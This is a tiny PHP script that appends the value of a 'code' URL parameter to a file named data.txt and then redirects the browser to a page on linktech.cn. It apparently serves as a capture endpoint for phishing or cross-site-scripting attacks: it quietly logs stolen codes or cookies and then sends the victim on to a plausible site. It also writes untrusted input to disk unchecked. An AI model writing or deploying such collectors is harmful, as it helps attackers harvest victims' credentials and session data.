<?php

file_put_contents("data.txt", $_GET["code"].'
# ', FILE_APPEND);
	
echo"<script>window.location.href='http://www.linktech.cn/AC_NEW/index.php';</script>";

	